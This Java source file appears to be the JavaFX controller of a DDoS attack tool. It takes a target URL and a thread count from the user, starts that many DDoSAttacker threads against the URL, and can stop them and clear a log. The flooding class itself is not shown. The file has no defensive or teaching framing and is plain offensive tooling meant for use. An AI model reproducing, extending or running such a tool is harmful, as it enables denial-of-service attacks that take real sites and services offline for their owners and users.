package sample;


import javafx.scene.control.*;

import java.util.ArrayList;
import java.util.regex.Matcher;
import java.util.regex.Pattern;


public class Controller {

    public Button sendAttackButton, stopAttackButton,clearLogButton;
    public TextField threadCountTextField, linkTextField;
    public ListView logsListView;
    ArrayList<DDoSAttacker> attackers = new ArrayList<>();

    public void sendAttack() {

        String regex = "^(https?|ftp|file)://[-a-zA-Z0-9+&@#/%?=~_|!:,.;]*[-a-zA-Z0-9+&@#/%=~_|]";
        String link = linkTextField.getCharacters().toString();
        String numberOfThreads = threadCountTextField.getCharacters().toString();
        logsListView.setItems(LogsList.logs);

        if (IsMatch(link, regex) && !numberOfThreads.equals("")) {
            try {
                int threadCount = Integer.parseInt(numberOfThreads);
                for(int i = 0; i < threadCount; i++) {
                    DDoSAttacker attacker = new DDoSAttacker(link);
                    attackers.add(attacker);
                    attacker.start();
                }

                System.out.println("Sending Attack to " + linkTextField.getCharacters().toString());
            } catch (Exception e) {
                Dialog<ButtonType> alert = new Alert(Alert.AlertType.INFORMATION);
                alert.setTitle("Invalid Request");
                alert.setContentText("Cannot Send Request, Please Check any Spelling errors in your URL!");
                alert.showAndWait();
                e.printStackTrace();
            }

        }
        else{
            Dialog<ButtonType> alert = new Alert(Alert.AlertType.INFORMATION);
            alert.setTitle("Invalid URL");
            alert.setContentText("Please enter valid URL and Number of threads value!");
            alert.showAndWait();
        }
    }


    private static boolean IsMatch(String s, String pattern) {
        try {
            Pattern patt = Pattern.compile(pattern);
            Matcher matcher = patt.matcher(s);
            return matcher.matches();
        } catch (RuntimeException e) {
            return false;
        }
    }

    public void clearLogs() {
        LogsList.logs.clear();
    }

    public void stopAttack() {
        for(DDoSAttacker attacker : attackers) {
            attacker.stopRunning();
        }
    }
}
